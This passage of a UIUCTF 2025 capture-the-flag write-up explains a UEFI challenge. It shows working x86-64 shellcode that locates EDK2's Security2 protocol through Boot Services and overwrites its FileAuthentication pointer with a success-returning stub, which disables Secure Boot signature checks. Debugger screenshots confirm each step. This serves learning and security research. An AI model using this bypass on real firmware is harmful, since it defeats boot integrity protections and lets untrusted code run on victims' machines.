<p>We can use this function to locate the Security2 protocol. To do this, we need to provide the GUID of the Security2 protocol and a pointer to the Interface variable. The Registration parameter is optional and can be NULL. LocateProtocol is part of the <a href="https://uefi.org/specs/UEFI/2.9_A/04_EFI_System_Table.html#efi-boot-services-table" target="_blank" rel="noopener noreffer ">Boot Services</a>, which are accessed through the EFI Boot Services Table. This table contains a header and pointers to all boot services functions.</p>
<p>Looking at how it’s used in the edk2 <a href="https://github.com/tianocore/edk2/blob/master/ArmPkg/Drivers/ArmCrashDumpDxe/ArmCrashDumpDxe.c#L26" target="_blank" rel="noopener noreffer ">source compiled</a>, we see a global variable <code>gBS</code> representing the Boot Services Table is used to call LocateProtocol.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Status</span> <span class="o">=</span> <span class="n">gBS</span><span class="o">-&gt;</span><span class="nf">LocateProtocol</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">gEfiCpuArchProtocolGuid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mCpu</span><span class="p">);</span></span></span></code></pre></div></div>
<p>We can verify if the gBS pointer is accessible to us. By setting a breakpoint at the start of the shellcode and using debug symbols, we can inspect the memory near our stack pointer (RSP) to locate gBS.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/gBS.png"
        data-srcset="/posts/uiuctf_2025/images/gBS.png, /posts/uiuctf_2025/images/gBS.png 1.5x, /posts/uiuctf_2025/images/gBS.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/gBS.png"
        title="img" width="1020" height="753" /></p>
<p>As we can see, gBS resides in memory at a fixed offset from RSP. This offset remains mostly constant across runs, which means we can reliably use it to retrieve the gBS pointer during exploitation.</p>
<p>At offset 0x140 within the gBS structure, we find the pointer to the LocateProtocol function.</p>
<p>In our shellcode, we need to call LocateProtocol with two arguments:</p>
<ul>
<li>The GUID of the Security2 protocol (which we can get from the edk2 source).</li>
<li>A pointer to a valid memory location where the protocol interface pointer will be stored (so we can read and modify it).</li>
</ul>
<p>Our goal is to overwrite the FileAuthentication member of the Security2 protocol interface with a stub function that simply XORs RAX with itself and returns. This effectively disables Secure Boot’s signature verification.</p>
<p>Here’s the final shellcode I used to perform this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-nasm">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="k">bits</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl"><span class="nf">default</span> <span class="nv">rel</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">start:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="nv">r11</span><span class="p">,</span> <span class="nb">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="nv">r11</span><span class="p">,</span> <span class="mh">0x25f48</span> <span class="c1">; Pointer to BootService (gBS) 0x25ec0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">lea</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nv">rel</span> <span class="nv">SECURITY2_GUID</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                     
</span></span><span class="line"><span class="cl">        <span class="nf">lea</span>     <span class="nv">r8</span><span class="p">,</span>  <span class="p">[</span><span class="nv">rel</span> <span class="nv">iface_slot</span><span class="p">]</span>       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nv">r11</span> <span class="o">+</span> <span class="mh">0x140</span><span class="p">]</span> <span class="c1">; gBS-&gt;LocateProtocol</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="nb">rax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jne</span>     <span class="nv">.fail</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="nv">r12</span><span class="p">,</span> <span class="p">[</span><span class="nv">rel</span> <span class="nv">iface_slot</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">lea</span>     <span class="nv">r13</span><span class="p">,</span> <span class="p">[</span><span class="nv">rel</span> <span class="nv">.fail</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="p">[</span><span class="nv">r12</span><span class="p">],</span> <span class="nv">r13</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">.fail:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">SECURITY2_GUID:</span>
</span></span><span class="line"><span class="cl">        <span class="kd">dd</span> <span class="mh">0x94ab2f58</span>
</span></span><span class="line"><span class="cl">        <span class="kd">dw</span> <span class="mh">0x1438</span>
</span></span><span class="line"><span class="cl">        <span class="kd">dw</span> <span class="mh">0x4ef1</span>
</span></span><span class="line"><span class="cl">        <span class="kd">db</span> <span class="mh">0x91</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x94</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0x68</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">iface_slot:</span>     <span class="kd">dq</span> <span class="mi">0</span></span></span></code></pre></div></div>
<blockquote>
<p>The calling convention here differs from the standard Linux x86-64 ABI. The arguments for the function are passed in RCX, RDX, and R8 instead of RDI, RSI, and RDX.</p></blockquote>
<p>When we run the shellcode, we can confirm that the FileAuthentication member of the Security2 protocol is successfully overwritten.</p>
<p>After calling LocateProtocol, the pointer to the protocol interface is stored at the location of the interface pointer (referred to as iface_slot):</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/locateprotocol.png"
        data-srcset="/posts/uiuctf_2025/images/locateprotocol.png, /posts/uiuctf_2025/images/locateprotocol.png 1.5x, /posts/uiuctf_2025/images/locateprotocol.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/locateprotocol.png"
        title="img" width="1232" height="738" /></p>
<p>Just before the final <code>mov</code> instruction, we observe the code preparing to overwrite the protocol’s function pointer with our stub <code>.fail</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/beforemov.png"
        data-srcset="/posts/uiuctf_2025/images/beforemov.png, /posts/uiuctf_2025/images/beforemov.png 1.5x, /posts/uiuctf_2025/images/beforemov.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/beforemov.png"
        title="img" width="1511" height="958" /></p>
<p>After executing the <code>mov</code>, the instruction pointer at that location points to our stub function, effectively disabling Secure Boot:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/aftermov.png"
        data-srcset="/posts/uiuctf_2025/images/aftermov.png, /posts/uiuctf_2025/images/aftermov.png 1.5x, /posts/uiuctf_2025/images/aftermov.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/aftermov.png"
        title="img" width="1093" height="960" /></p>
<p>From here, we can simply return normally (ret), and the Lua interpreter resumes safely. Inside the interpreter, running <code>os.exit()</code> returns us to the menu.</p>
<p>At the menu, we can now start the Linux kernel without Secure Boot blocking us and finally read the flag:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/flag.png"
        data-srcset="/posts/uiuctf_2025/images/flag.png, /posts/uiuctf_2025/images/flag.png 1.5x, /posts/uiuctf_2025/images/flag.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/flag.png"
        title="img" width="658" height="306" /></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-07-30</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/uiuctf_2025/" data-title="UIUCTF 2025" data-via="Infobahn_ctf" data-hashtags="PWN,kernel,Use-After-Free,telefork,retspill,KROP,mimalloc,UEFI,Lua,Secure Boot,EDK2"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/uiuctf_2025/" data-title="UIUCTF 2025"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/uiuctf_2025/" data-hashtag="PWN"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/uiuctf_2025/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">PWN</a>,&nbsp;<a href="/tags/kernel/">Kernel</a>,&nbsp;<a href="/tags/use-after-free/">Use-After-Free</a>,&nbsp;<a href="/tags/telefork/">Telefork</a>,&nbsp;<a href="/tags/retspill/">Retspill</a>,&nbsp;<a href="/tags/krop/">KROP</a>,&nbsp;<a href="/tags/mimalloc/">Mimalloc</a>,&nbsp;<a href="/tags/uefi/">UEFI</a>,&nbsp;<a href="/tags/lua/">Lua</a>,&nbsp;<a href="/tags/secure-boot/">Secure Boot</a>,&nbsp;<a href="/tags/edk2/">EDK2</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"></div>
</div>
</article></div>
            </main></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
</html>
